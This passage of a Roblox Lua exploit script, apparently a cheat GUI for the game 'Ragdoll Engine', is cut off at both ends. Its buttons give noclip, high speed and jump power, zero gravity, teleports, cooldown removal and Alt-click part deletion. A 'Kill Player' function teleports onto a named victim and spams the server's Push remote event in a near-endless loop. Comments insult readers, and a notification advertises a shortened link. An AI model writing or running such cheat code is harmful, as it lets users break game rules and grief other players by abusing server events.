FunctionsPage.BackgroundColor3 = Color3.new(0.156863, 0.156863, 0.156863)
FunctionsPage.BorderColor3 = Color3.new(0.0980392, 0.0980392, 0.0980392)
FunctionsPage.Position = UDim2.new(0.0322580636, 0, 0.759162307, 0)
FunctionsPage.Size = UDim2.new(0, 302, 0, 33)
FunctionsPage.ZIndex = 3
FunctionsPage.Font = Enum.Font.SourceSansLight
FunctionsPage.Text = "Functions Page"
FunctionsPage.TextColor3 = Color3.new(1, 1, 1)
FunctionsPage.TextSize = 22
TeleportsPage.Name = "TeleportsPage"
TeleportsPage.Parent = MenuFrame
TeleportsPage.BackgroundColor3 = Color3.new(0.156863, 0.156863, 0.156863)
TeleportsPage.BorderColor3 = Color3.new(0.0980392, 0.0980392, 0.0980392)
TeleportsPage.Position = UDim2.new(0.0322580636, 0, 0.539267004, 0)
TeleportsPage.Size = UDim2.new(0, 302, 0, 33)
TeleportsPage.ZIndex = 3
TeleportsPage.Font = Enum.Font.SourceSansLight
TeleportsPage.Text = "Teleports Page"
TeleportsPage.TextColor3 = Color3.new(1, 1, 1)
TeleportsPage.TextSize = 22
Exit.Name = "Exit"
Exit.Parent = MenuFrame
Exit.BackgroundColor3 = Color3.new(0.666667, 0.156863, 0.156863)
Exit.BorderColor3 = Color3.new(0.0980392, 0.0980392, 0.0980392)
Exit.Position = UDim2.new(0.717741907, 0, 0.0942408368, 0)
Exit.Size = UDim2.new(0, 47, 0, 33)
Exit.ZIndex = 3
Exit.Font = Enum.Font.SourceSansLight
Exit.Text = "Exit"
Exit.TextColor3 = Color3.new(1, 1, 1)
Exit.TextSize = 22
Hide.Name = "Hide"
Hide.Parent = MenuFrame
Hide.BackgroundColor3 = Color3.new(0.156863, 0.156863, 0.156863)
Hide.BorderColor3 = Color3.new(0.0980392, 0.0980392, 0.0980392)
Hide.Position = UDim2.new(0.556451619, 0, 0.0942408368, 0)
Hide.Size = UDim2.new(0, 47, 0, 33)
Hide.ZIndex = 3
Hide.Font = Enum.Font.SourceSansLight
Hide.Text = "Hide"
Hide.TextColor3 = Color3.new(1, 1, 1)
Hide.TextSize = 22
MainColorBar.Name = "MainColorBar"
MainColorBar.Parent = MainFrame
MainColorBar.Active = true
MainColorBar.BackgroundColor3 = Color3.new(1, 0, 0)
MainColorBar.BorderColor3 = Color3.new(0, 0, 0)
MainColorBar.BorderSizePixel = 0
MainColorBar.Size = UDim2.new(0, 372, 0, 3)
MainColorBar.ZIndex = 3
MainContent.Name = "MainContent"
MainContent.Parent = MainFrame
MainContent.Active = true
MainContent.BackgroundColor3 = Color3.new(0, 0, 0)
MainContent.BackgroundTransparency = 1
MainContent.BorderColor3 = Color3.new(0, 0, 0)
MainContent.BorderSizePixel = 0
MainContent.Position = UDim2.new(0.17473118, 0, 0.0520833321, 0)
MainContent.Size = UDim2.new(0, 298, 0, 174)
Title.Name = "Title"
Title.Parent = MainContent
Title.Active = true
Title.BackgroundColor3 = Color3.new(0, 0, 0)
Title.BackgroundTransparency = 1
Title.BorderColor3 = Color3.new(0, 0, 0)
Title.BorderSizePixel = 0
Title.Size = UDim2.new(0, 298, 0, 41)
Title.Font = Enum.Font.SourceSansLight
Title.Text = "Ragdoll Engine U"
Title.TextColor3 = Color3.new(1, 1, 1)
Title.TextSize = 32
Credits.Name = "Credits"
Credits.Parent = MainContent
Credits.Active = true
Credits.BackgroundColor3 = Color3.new(0, 0, 0)
Credits.BackgroundTransparency = 1
Credits.BorderColor3 = Color3.new(0, 0, 0)
Credits.BorderSizePixel = 0
Credits.Position = UDim2.new(0, 0, 0.333333343, 0)
Credits.Size = UDim2.new(0, 298, 0, 116)
Credits.Font = Enum.Font.SourceSansLight
Credits.Text = "-- This gui was made by Lz0x#1510 on discord                                                            -- Hover over the grey tab to use."
Credits.TextColor3 = Color3.new(1, 1, 1)
Credits.TextSize = 22
Credits.TextWrapped = true
Credits.TextXAlignment = Enum.TextXAlignment.Left
Credits.TextYAlignment = Enum.TextYAlignment.Top
FunctionsContent.Name = "FunctionsContent"
FunctionsContent.Parent = MainFrame
FunctionsContent.Active = true
FunctionsContent.BackgroundColor3 = Color3.new(0, 0, 0)
FunctionsContent.BackgroundTransparency = 1
FunctionsContent.BorderColor3 = Color3.new(0, 0, 0)
FunctionsContent.BorderSizePixel = 0
FunctionsContent.Position = UDim2.new(0.174999997, 0, 0.0520000011, 0)
FunctionsContent.Size = UDim2.new(0, 298, 0, 174)
FunctionsContent.Visible = false
WalkSpeed.Name = "WalkSpeed"
WalkSpeed.Parent = FunctionsContent
WalkSpeed.BackgroundColor3 = Color3.new(0, 0, 0)
WalkSpeed.BackgroundTransparency = 0.69999998807907
WalkSpeed.BorderColor3 = Color3.new(0, 0, 0)
WalkSpeed.BorderSizePixel = 0
WalkSpeed.Size = UDim2.new(0, 141, 0, 22)
WalkSpeed.Font = Enum.Font.SourceSansLight
WalkSpeed.Text = "WalkSpeed - Off"
WalkSpeed.TextColor3 = Color3.new(1, 1, 1)
WalkSpeed.TextSize = 22
JumpPower.Name = "JumpPower"
JumpPower.Parent = FunctionsContent
JumpPower.BackgroundColor3 = Color3.new(0, 0, 0)
JumpPower.BackgroundTransparency = 0.69999998807907
JumpPower.BorderColor3 = Color3.new(0, 0, 0)
JumpPower.BorderSizePixel = 0
JumpPower.Position = UDim2.new(0, 0, 0.160919547, 0)
JumpPower.Size = UDim2.new(0, 141, 0, 22)
JumpPower.Font = Enum.Font.SourceSansLight
JumpPower.Text = "JumpPower - Off"
JumpPower.TextColor3 = Color3.new(1, 1, 1)
JumpPower.TextSize = 22
SpamTools.Name = "SpamTools"
SpamTools.Parent = FunctionsContent
SpamTools.BackgroundColor3 = Color3.new(0, 0, 0)
SpamTools.BackgroundTransparency = 0.69999998807907
SpamTools.BorderColor3 = Color3.new(0, 0, 0)
SpamTools.BorderSizePixel = 0
SpamTools.Position = UDim2.new(0, 0, 0.482758641, 0)
SpamTools.Size = UDim2.new(0, 141, 0, 22)
SpamTools.Font = Enum.Font.SourceSansLight
SpamTools.Text = "Spam Tools"
SpamTools.TextColor3 = Color3.new(1, 1, 1)
SpamTools.TextSize = 22
Gravity.Name = "Gravity"
Gravity.Parent = FunctionsContent
Gravity.BackgroundColor3 = Color3.new(0, 0, 0)
Gravity.BackgroundTransparency = 0.69999998807907
Gravity.BorderColor3 = Color3.new(0, 0, 0)
Gravity.BorderSizePixel = 0
Gravity.Position = UDim2.new(0, 0, 0.321839094, 0)
Gravity.Size = UDim2.new(0, 141, 0, 22)
Gravity.Font = Enum.Font.SourceSansLight
Gravity.Text = "Gravity - Off"
Gravity.TextColor3 = Color3.new(1, 1, 1)
Gravity.TextSize = 22
KillPlayer.Name = "KillPlayer"
KillPlayer.Parent = FunctionsContent
KillPlayer.BackgroundColor3 = Color3.new(0, 0, 0)
KillPlayer.BackgroundTransparency = 0.69999998807907
KillPlayer.BorderColor3 = Color3.new(0, 0, 0)
KillPlayer.BorderSizePixel = 0
KillPlayer.Position = UDim2.new(0, 0, 0.643678188, 0)
KillPlayer.Size = UDim2.new(0, 141, 0, 22)
KillPlayer.Font = Enum.Font.SourceSansLight
KillPlayer.Text = "Kill Player"
KillPlayer.TextColor3 = Color3.new(1, 1, 1)
KillPlayer.TextSize = 22
TpToPlayer.Name = "TpToPlayer"
TpToPlayer.Parent = FunctionsContent
TpToPlayer.BackgroundColor3 = Color3.new(0, 0, 0)
TpToPlayer.BackgroundTransparency = 0.69999998807907
TpToPlayer.BorderColor3 = Color3.new(0, 0, 0)
TpToPlayer.BorderSizePixel = 0
TpToPlayer.Position = UDim2.new(0.526845634, 0, 0.643678188, 0)
TpToPlayer.Size = UDim2.new(0, 141, 0, 22)
TpToPlayer.Font = Enum.Font.SourceSansLight
TpToPlayer.Text = "Tp To Player"
TpToPlayer.TextColor3 = Color3.new(1, 1, 1)
TpToPlayer.TextSize = 22
Spin.Name = "Spin"
Spin.Parent = FunctionsContent
Spin.BackgroundColor3 = Color3.new(0, 0, 0)
Spin.BackgroundTransparency = 0.69999998807907
Spin.BorderColor3 = Color3.new(0, 0, 0)
Spin.BorderSizePixel = 0
Spin.Position = UDim2.new(0.526845634, 0, 0.482758641, 0)
Spin.Size = UDim2.new(0, 141, 0, 22)
Spin.Font = Enum.Font.SourceSansLight
Spin.Text = "Spin"
Spin.TextColor3 = Color3.new(1, 1, 1)
Spin.TextSize = 22
AltDelete.Name = "Alt Delete"
AltDelete.Parent = FunctionsContent
AltDelete.BackgroundColor3 = Color3.new(0, 0, 0)
AltDelete.BackgroundTransparency = 0.69999998807907
AltDelete.BorderColor3 = Color3.new(0, 0, 0)
AltDelete.BorderSizePixel = 0
AltDelete.Position = UDim2.new(0.526845634, 0, 0.321839094, 0)
AltDelete.Size = UDim2.new(0, 141, 0, 22)
AltDelete.Font = Enum.Font.SourceSansLight
AltDelete.Text = "Alt Delete"
AltDelete.TextColor3 = Color3.new(1, 1, 1)
AltDelete.TextSize = 22
NoRagdoll.Name = "No Ragdoll"
NoRagdoll.Parent = FunctionsContent
NoRagdoll.BackgroundColor3 = Color3.new(0, 0, 0)
NoRagdoll.BackgroundTransparency = 0.69999998807907
NoRagdoll.BorderColor3 = Color3.new(0, 0, 0)
NoRagdoll.BorderSizePixel = 0
NoRagdoll.Position = UDim2.new(0.526845634, 0, 0.160919547, 0)
NoRagdoll.Size = UDim2.new(0, 141, 0, 22)
NoRagdoll.Font = Enum.Font.SourceSansLight
NoRagdoll.Text = "No Ragdoll"
NoRagdoll.TextColor3 = Color3.new(1, 1, 1)
NoRagdoll.TextSize = 22
Noclip.Name = "Noclip"
Noclip.Parent = FunctionsContent
Noclip.BackgroundColor3 = Color3.new(0, 0, 0)
Noclip.BackgroundTransparency = 0.69999998807907
Noclip.BorderColor3 = Color3.new(0, 0, 0)
Noclip.BorderSizePixel = 0
Noclip.Position = UDim2.new(0.526845634, 0, 0, 0)
Noclip.Size = UDim2.new(0, 141, 0, 22)
Noclip.Font = Enum.Font.SourceSansLight
Noclip.Text = "Noclip - Off"
Noclip.TextColor3 = Color3.new(1, 1, 1)
Noclip.TextSize = 22
Victim.Name = "Victim"
Victim.Parent = FunctionsContent
Victim.BackgroundColor3 = Color3.new(0, 0, 0)
Victim.BackgroundTransparency = 0.69999998807907
Victim.BorderColor3 = Color3.new(0, 0, 0)
Victim.BorderSizePixel = 0
Victim.Position = UDim2.new(0, 0, 0.816091955, 0)
Victim.Size = UDim2.new(0, 298, 0, 22)
Victim.Font = Enum.Font.SourceSansLight
Victim.PlaceholderColor3 = Color3.new(1, 1, 1)
Victim.PlaceholderText = "Victim"
Victim.Text = ""
Victim.TextColor3 = Color3.new(1, 1, 1)
Victim.TextSize = 22
TeleportsContent.Name = "TeleportsContent"
TeleportsContent.Parent = MainFrame
TeleportsContent.Active = true
TeleportsContent.BackgroundColor3 = Color3.new(0, 0, 0)
TeleportsContent.BackgroundTransparency = 1
TeleportsContent.BorderColor3 = Color3.new(0, 0, 0)
TeleportsContent.BorderSizePixel = 0
TeleportsContent.Position = UDim2.new(0.174999997, 0, 0.0520000011, 0)
TeleportsContent.Size = UDim2.new(0, 298, 0, 174)
TeleportsContent.Visible = false
TpSign.Name = "TpSign"
TpSign.Parent = TeleportsContent
TpSign.BackgroundColor3 = Color3.new(0, 0, 0)
TpSign.BackgroundTransparency = 0.69999998807907
TpSign.BorderColor3 = Color3.new(0, 0, 0)
TpSign.BorderSizePixel = 0
TpSign.Size = UDim2.new(0, 142, 0, 23)
TpSign.Font = Enum.Font.SourceSansLight
TpSign.Text = "Sign"
TpSign.TextColor3 = Color3.new(1, 1, 1)
TpSign.TextSize = 22
TpEscalatorTop.Name = "TpEscalatorTop"
TpEscalatorTop.Parent = TeleportsContent
TpEscalatorTop.BackgroundColor3 = Color3.new(0, 0, 0)
TpEscalatorTop.BackgroundTransparency = 0.69999998807907
TpEscalatorTop.BorderColor3 = Color3.new(0, 0, 0)
TpEscalatorTop.BorderSizePixel = 0
TpEscalatorTop.Position = UDim2.new(0, 0, 0.166666672, 0)
TpEscalatorTop.Size = UDim2.new(0, 142, 0, 23)
TpEscalatorTop.Font = Enum.Font.SourceSansLight
TpEscalatorTop.Text = "Escalator Top"
TpEscalatorTop.TextColor3 = Color3.new(1, 1, 1)
TpEscalatorTop.TextSize = 22
TpEscalatorBottom.Name = "TpEscalatorBottom"
TpEscalatorBottom.Parent = TeleportsContent
TpEscalatorBottom.BackgroundColor3 = Color3.new(0, 0, 0)
TpEscalatorBottom.BackgroundTransparency = 0.69999998807907
TpEscalatorBottom.BorderColor3 = Color3.new(0, 0, 0)
TpEscalatorBottom.BorderSizePixel = 0
TpEscalatorBottom.Position = UDim2.new(0, 0, 0.333333343, 0)
TpEscalatorBottom.Size = UDim2.new(0, 142, 0, 23)
TpEscalatorBottom.Font = Enum.Font.SourceSansLight
TpEscalatorBottom.Text = "Escalator Bottom"
TpEscalatorBottom.TextColor3 = Color3.new(1, 1, 1)
TpEscalatorBottom.TextSize = 22
TpBuildingTop.Name = "TpBuildingTop"
TpBuildingTop.Parent = TeleportsContent
TpBuildingTop.BackgroundColor3 = Color3.new(0, 0, 0)
TpBuildingTop.BackgroundTransparency = 0.69999998807907
TpBuildingTop.BorderColor3 = Color3.new(0, 0, 0)
TpBuildingTop.BorderSizePixel = 0
TpBuildingTop.Position = UDim2.new(0, 0, 0.5, 0)
TpBuildingTop.Size = UDim2.new(0, 142, 0, 23)
TpBuildingTop.Font = Enum.Font.SourceSansLight
TpBuildingTop.Text = "Building Top"
TpBuildingTop.TextColor3 = Color3.new(1, 1, 1)
TpBuildingTop.TextSize = 22
TpBuildingMiddle.Name = "TpBuildingMiddle"
TpBuildingMiddle.Parent = TeleportsContent
TpBuildingMiddle.BackgroundColor3 = Color3.new(0, 0, 0)
TpBuildingMiddle.BackgroundTransparency = 0.69999998807907
TpBuildingMiddle.BorderColor3 = Color3.new(0, 0, 0)
TpBuildingMiddle.BorderSizePixel = 0
TpBuildingMiddle.Position = UDim2.new(0, 0, 0.666666687, 0)
TpBuildingMiddle.Size = UDim2.new(0, 142, 0, 23)
TpBuildingMiddle.Font = Enum.Font.SourceSansLight
TpBuildingMiddle.Text = "Building Middlle"
TpBuildingMiddle.TextColor3 = Color3.new(1, 1, 1)
TpBuildingMiddle.TextSize = 22
TpBuildingBin.Name = "TpBuildingBin"
TpBuildingBin.Parent = TeleportsContent
TpBuildingBin.BackgroundColor3 = Color3.new(0, 0, 0)
TpBuildingBin.BackgroundTransparency = 0.69999998807907
TpBuildingBin.BorderColor3 = Color3.new(0, 0, 0)
TpBuildingBin.BorderSizePixel = 0
TpBuildingBin.Position = UDim2.new(0, 0, 0.833333373, 0)
TpBuildingBin.Size = UDim2.new(0, 142, 0, 23)
TpBuildingBin.Font = Enum.Font.SourceSansLight
TpBuildingBin.Text = "Building Bin"
TpBuildingBin.TextColor3 = Color3.new(1, 1, 1)
TpBuildingBin.TextSize = 22
TpTempleStaircase.Name = "TpTempleStaircase"
TpTempleStaircase.Parent = TeleportsContent
TpTempleStaircase.BackgroundColor3 = Color3.new(0, 0, 0)
TpTempleStaircase.BackgroundTransparency = 0.69999998807907
TpTempleStaircase.BorderColor3 = Color3.new(0, 0, 0)
TpTempleStaircase.BorderSizePixel = 0
TpTempleStaircase.Position = UDim2.new(0.523489952, 0, 0.833333373, 0)
TpTempleStaircase.Size = UDim2.new(0, 142, 0, 23)
TpTempleStaircase.Font = Enum.Font.SourceSansLight
TpTempleStaircase.Text = "Temple Staircase"
TpTempleStaircase.TextColor3 = Color3.new(1, 1, 1)
TpTempleStaircase.TextSize = 22
TpSpiralStaircase.Name = "TpSpiralStaircase"
TpSpiralStaircase.Parent = TeleportsContent
TpSpiralStaircase.BackgroundColor3 = Color3.new(0, 0, 0)
TpSpiralStaircase.BackgroundTransparency = 0.69999998807907
TpSpiralStaircase.BorderColor3 = Color3.new(0, 0, 0)
TpSpiralStaircase.BorderSizePixel = 0
TpSpiralStaircase.Position = UDim2.new(0.523489952, 0, 0.666666687, 0)
TpSpiralStaircase.Size = UDim2.new(0, 142, 0, 23)
TpSpiralStaircase.Font = Enum.Font.SourceSansLight
TpSpiralStaircase.Text = "Spiral Staircase"
TpSpiralStaircase.TextColor3 = Color3.new(1, 1, 1)
TpSpiralStaircase.TextSize = 22
TpEdge.Name = "TpEdge"
TpEdge.Parent = TeleportsContent
TpEdge.BackgroundColor3 = Color3.new(0, 0, 0)
TpEdge.BackgroundTransparency = 0.69999998807907
TpEdge.BorderColor3 = Color3.new(0, 0, 0)
TpEdge.BorderSizePixel = 0
TpEdge.Position = UDim2.new(0.523489952, 0, 0.5, 0)
TpEdge.Size = UDim2.new(0, 142, 0, 23)
TpEdge.Font = Enum.Font.SourceSansLight
TpEdge.Text = "Edge"
TpEdge.TextColor3 = Color3.new(1, 1, 1)
TpEdge.TextSize = 22
TpCannonRange.Name = "TpCannonRange"
TpCannonRange.Parent = TeleportsContent
TpCannonRange.BackgroundColor3 = Color3.new(0, 0, 0)
TpCannonRange.BackgroundTransparency = 0.69999998807907
TpCannonRange.BorderColor3 = Color3.new(0, 0, 0)
TpCannonRange.BorderSizePixel = 0
TpCannonRange.Position = UDim2.new(0.523489952, 0, 0.333333343, 0)
TpCannonRange.Size = UDim2.new(0, 142, 0, 23)
TpCannonRange.Font = Enum.Font.SourceSansLight
TpCannonRange.Text = "Cannon Range"
TpCannonRange.TextColor3 = Color3.new(1, 1, 1)
TpCannonRange.TextSize = 22
TpPool.Name = "TpPool"
TpPool.Parent = TeleportsContent
TpPool.BackgroundColor3 = Color3.new(0, 0, 0)
TpPool.BackgroundTransparency = 0.69999998807907
TpPool.BorderColor3 = Color3.new(0, 0, 0)
TpPool.BorderSizePixel = 0
TpPool.Position = UDim2.new(0.523489952, 0, 0.166666672, 0)
TpPool.Size = UDim2.new(0, 142, 0, 23)
TpPool.Font = Enum.Font.SourceSansLight
TpPool.Text = "Pool"
TpPool.TextColor3 = Color3.new(1, 1, 1)
TpPool.TextSize = 22
TpBalloon.Name = "TpBalloon"
TpBalloon.Parent = TeleportsContent
TpBalloon.BackgroundColor3 = Color3.new(0, 0, 0)
TpBalloon.BackgroundTransparency = 0.69999998807907
TpBalloon.BorderColor3 = Color3.new(0, 0, 0)
TpBalloon.BorderSizePixel = 0
TpBalloon.Position = UDim2.new(0.523489952, 0, 0, 0)
TpBalloon.Size = UDim2.new(0, 142, 0, 23)
TpBalloon.Font = Enum.Font.SourceSansLight
TpBalloon.Text = "Balloon"
TpBalloon.TextColor3 = Color3.new(1, 1, 1)
TpBalloon.TextSize = 22

--[ STOP SKIDDING YOU FAT FUCK ]--

Noclip.MouseButton1Click:connect(function()
			if phase == false then
		phase = true
		Noclip.TextColor3 = Color3.new(0, 1, 0)
		Noclip.Text = "Noclip - On"
		Stepped = game:GetService("RunService").Stepped:Connect(function()
			if phase == true then
				for a, b in pairs(W:GetChildren()) do
                if b.Name == P.Name then
                for i, v in pairs(W[P.Name]:GetChildren()) do
                if v:IsA("BasePart") then
                v.CanCollide = false
                end end end end
			else
				Stepped:Disconnect()
			end
		end)
	elseif phase == true then
		phase = false
		Noclip.TextColor3 = Color3.new(1, 1, 1)
		Noclip.Text = "Noclip - Off"
	end
end)
OpenFrame:TweenPosition(UDim2.new({0, 0}, -197, 0.35))
wait(0.5)
MenuFrame.MouseEnter:connect(function()
	if visual == false then
		MenuFrame:TweenPosition(UDim2.new({0, 0},0, 0))
		wait(0.5)
		visual = true
	end
end)
MenuFrame.MouseEnter:connect(function()
	if dollstopper == true then
	local rag = game:GetService("Players").LocalPlayer.Character:FindFirstChild("Local Ragdoll")
	rag:Destroy()
end
end)
MenuFrame.MouseEnter:connect(function()
	if speeding == false then
	P.Humanoid.WalkSpeed = 150
end
end)
MainFrame.MouseEnter:connect(function()
	if speeding == false then
	P.Humanoid.WalkSpeed = 150
end
end)
MenuFrame.MouseEnter:connect(function()
	if highjumping == false then
	P.Humanoid.JumpPower = 150
end
end)
MainFrame.MouseEnter:connect(function()
	if highjumping == false then
	P.Humanoid.JumpPower = 150
end
end)
MenuFrame.MouseEnter:connect(function()
	if spammer == true then
	local bag = game:GetService("Players").LocalPlayer.Backpack
	bag.ImpulseGrenade.Configuration.Cooldown.Value = 0
	bag.Push.Configuration.Cooldown.Value = 0
end
end)
MainFrame.MouseEnter:connect(function()
	if dollstopper == true then
	local rag = game:GetService("Players").LocalPlayer.Character:FindFirstChild("Local Ragdoll")
	rag:Destroy()
end
end)
MainFrame.MouseEnter:connect(function()
	if spammer == true then
	local bag = game:GetService("Players").LocalPlayer.Backpack
	bag.ImpulseGrenade.Configuration.Cooldown.Value = 0
	bag.Push.Configuration.Cooldown.Value = 0
end
end)
Exit.MouseButton1Click:connect(function()
	MenuFrame:TweenPosition(UDim2.new({0, 0},-320, 0))
	wait(0.5)
	MainFrame:TweenPosition(UDim2.new({0, 0},-494, 0.35))
	wait(0.5)
	speeding = true
	highjumping = true
	dollstopper = false
	spammer = false
	phase = false
	mooneffect = true
	Gui:Destroy()
end)
Back.MouseButton1Click:connect(function()
	MenuFrame:TweenPosition(UDim2.new({0, 0},-320, 0))
	wait(0.5)	
	visual = false
end)
Hide.MouseButton1Click:connect(function()
	MenuFrame:TweenPosition(UDim2.new({0, 0},-320, 0))
	wait(0.5)
	visual = false
	MainFrame:TweenPosition(UDim2.new({0, 0},-494, 0.35))
	wait(0.9)
	MainFrame.Visible = false
	OpenFrame.Visible = true
	OpenFrame:TweenPosition(UDim2.new({0, 0}, 0, 0.35))
	wait(0.5)
end)
Open.MouseButton1Click:connect(function()
	OpenFrame:TweenPosition(UDim2.new({0, 0}, -197, 0.35))
	wait(0.9)
	OpenFrame.Visible = false
	MainFrame.Visible = true
	MainFrame:TweenPosition(UDim2.new({0, 0},405, 0.35))
	wait(0.5)
end)
MainPage.MouseButton1Click:connect(function()
	TeleportsContent.Visible = false
	FunctionsContent.Visible = false
	MainContent.Visible = true
	MenuFrame:TweenPosition(UDim2.new({0, 0},-320, 0))
	wait(0.5)	
	visual = false
end)
TeleportsPage.MouseButton1Click:connect(function()
	TeleportsContent.Visible = true
	FunctionsContent.Visible = false
	MainContent.Visible = false
	MenuFrame:TweenPosition(UDim2.new({0, 0},-320, 0))
	wait(0.5)	
	visual = false
end)
FunctionsPage.MouseButton1Click:connect(function()
	TeleportsContent.Visible = false
	FunctionsContent.Visible = true
	MainContent.Visible = false
	MenuFrame:TweenPosition(UDim2.new({0, 0},-320, 0))
	wait(0.5)	
	visual = false
end)
VipServer.MouseButton1Click:connect(function()
local bindableFunction= Instance.new("BindableFunction")  game.StarterGui:SetCore("SendNotification", {     Title = "V.I.P. Server:";     Text = "shorturl.at/hoSVZ";     Duration = "20";     callbakc = bindableFunction;     Button1 = ""; })
end)
WalkSpeed.MouseButton1Click:connect(function()
    if speeding == true then
	speeding = false
	game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 150
	WalkSpeed.Text = "WalkSpeed - On"
	WalkSpeed.TextColor3 = Color3.new(0, 1, 0)
elseif speeding == false then
	speeding = true
	game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 16
	WalkSpeed.Text = "WalkSpeed - Off"
	WalkSpeed.TextColor3 = Color3.new(1, 1, 1)
end
end)
JumpPower.MouseButton1Click:connect(function()
    if highjumping == true then
	highjumping = false
	game.Players.LocalPlayer.Character.Humanoid.JumpPower = 150
	JumpPower.Text = "JumpPower - On"
	JumpPower.TextColor3 = Color3.new(0, 1, 0)
elseif highjumping == false then
	highjumping = true
	game.Players.LocalPlayer.Character.Humanoid.JumpPower = 50
	JumpPower.Text = "JumpPower - Off"
	JumpPower.TextColor3 = Color3.new(1, 1, 1)
end
end)
KillPlayer.MouseButton1Click:connect(function()
local tp_namedplayer = Victim.Text
    local tp_player = game:GetService("Players")[tp_namedplayer]
    local PLR = game:GetService("Players").LocalPlayer
    local p = Victim.Text
   
    if tp_player then
            for i = 1, 60 do
        wait(0.005)
        PLR.Character.HumanoidRootPart.CFrame = tp_player.Character.HumanoidRootPart.CFrame + Vector3.new(1, -1, -1)
        end
    end
end)
KillPlayer.MouseButton1Click:connect(function()
	for i=1, 100000000000000000 do
		for i=1, 15 do
			game.Players.LocalPlayer.Character.Push.PushEvent:FireServer()
	end wait(0.005) end
end)
TpToPlayer.MouseButton1Click:connect(function()
local tp_namedplayer = Victim.Text
    local tp_player = game:GetService("Players")[tp_namedplayer]
    local PLR = game:GetService("Players").LocalPlayer
    local p = Victim.Text
   
    if tp_player then
            for i = 1,1 do
        wait()
        PLR.Character.HumanoidRootPart.CFrame = tp_player.Character.HumanoidRootPart.CFrame + Vector3.new(0, 4, 0)
        end
    end
end)
AltDelete.MouseButton1Click:connect(function()
	if deleting == false then
		local Plr = game:GetService("Players").LocalPlayer
local Mouse = Plr:GetMouse()
Mouse.Button1Down:connect(function()
if not game:GetService("UserInputService"):IsKeyDown(Enum.KeyCode.LeftAlt) then return end
if not Mouse.Target then return end
Mouse.Target:Destroy()
end)
local Plr = game:GetService("Players").LocalPlayer
local Mouse = Plr:GetMouse()
Mouse.Button1Down:connect(function()
if not game:GetService("UserInputService"):IsKeyDown(Enum.KeyCode.RightAlt) then return end
if not Mouse.Target then return end
Mouse.Target:Destroy()
end)
	end
	deleting = true
	AltDelete.TextColor3 = Color3.new(0, 1, 0)
end)
TpEdge.MouseButton1Click:connect(function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, 3.15, 820)
end)
TpCannonRange.MouseButton1Click:connect(function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(10, 3.25, 63)
end)
TpPool.MouseButton1Click:connect(function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-127.015, 3.3479, -126)
end)
TpBuildingTop.MouseButton1Click:connect(function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(161.782, 1013.35, -6)
end)

--[ Now, you are probably wondering why i have text in the middle of the teleports. Its just to annoy you lol.]--

TpBuildingMiddle.MouseButton1Click:connect(function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(159.5, 523.4, -32)
end)
TpTempleStaircase.MouseButton1Click:connect(function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-17.2, 179.15, -332)
end)
TpSpiralStaircase.MouseButton1Click:connect(function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(157, 827.25, -131)
end)
TpSign.MouseButton1Click:connect(function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, 21, -31)
end)
TpEscalatorBottom.MouseButton1Click:connect(function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-132.8, 3, -44)
end)
TpEscalatorTop.MouseButton1Click:connect(function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-209, 67.25, -52)
end)
TpBuildingBin.MouseButton1Click:connect(function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(150, 4.7, -45)
end)
TpBalloon.MouseButton1Click:connect(function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-112, 3.25, 43)
end)
Spin.MouseButton1Click:connect(function()
	local bambam = Instance.new("BodyThrust")
bambam.Parent = game.Players.LocalPlayer.Character.HumanoidRootPart
bambam.Force = Vector3.new(100,0,100)
bambam.Location = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
local holding = false
local plr = game.Players.LocalPlayer
local UIS = game:GetService("UserInputService")
local mouse = plr:GetMouse()
local debounce = false
mouse.TargetFilter = workspace:FindFirstChild("Baseplate")

UIS.InputBegan:Connect(function(key)

if key.KeyCode == Enum.KeyCode.LeftControl then

    holding = true

end
end)
wait(0.5)
end)
SpamTools.MouseButton1Click:connect(function()
	local Pl = game:GetService("Players").LocalPlayer
	Pl.Backpack.Push.Configuration.Cooldown.Value = 0
	Pl.Backpack.ImpulseGrenade.Configuration.Cooldown.Value = 0
	SpamTools.TextColor3 = Color3.new(0, 1, 0)
	spammer = true
end)
Gravity.MouseButton1Click:connect(function()
    if mooneffect == true then
	mooneffect = false
	W.Gravity = 0
	Gravity.Text = "Gravity - On"
	Gravity.TextColor3 = Color3.new(0, 1, 0)
elseif mooneffect == false then
	mooneffect = true
	W.Gravity = 196.2
	Gravity.Text = "Gravity - Off"
	Gravity.TextColor3 = Color3.new(1, 1, 1)
end
end)
NoRagdoll.MouseButton1Click:connect(function()
local rag = game:GetService("Players").LocalPlayer.Character:FindFirstChild("Local Ragdoll")
rag:Destroy()
NoRagdoll.TextColor3 = Color3.new(0, 1, 0)
dollstopper = true
end)
function zigzag(X) return math.acos(math.cos(X*math.pi))/math.pi end
counter = 0

while wait(0.05) do
OpenColorBar.BackgroundColor3 = Color3.fromHSV(zigzag(counter),1,1)
MainColorBar.BackgroundColor3 = Color3.fromHSV(zigzag(counter),1,1)
counter = counter + 0.0075
end
end)

Section:NewButton("Ragdoll Engine Gui 3 ", "Give op Gui", function()
-- Gui to Lua
-- Version: 3.2

-- Instances:

local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local TextLabel = Instance.new("TextLabel")
local TextLabel_2 = Instance.new("TextLabel")
local g = Instance.new("TextButton")
local sc = Instance.new("TextButton")
local M = Instance.new("TextButton")
local TextButton = Instance.new("TextButton")
local extra = Instance.new("Frame")
local eee = Instance.new("TextButton")
local eee_2 = Instance.new("TextButton")
local eee_3 = Instance.new("TextButton")
local eee_4 = Instance.new("TextButton")
local eee_5 = Instance.new("TextButton")
local eee_6 = Instance.new("TextButton")
local eee_7 = Instance.new("TextButton")
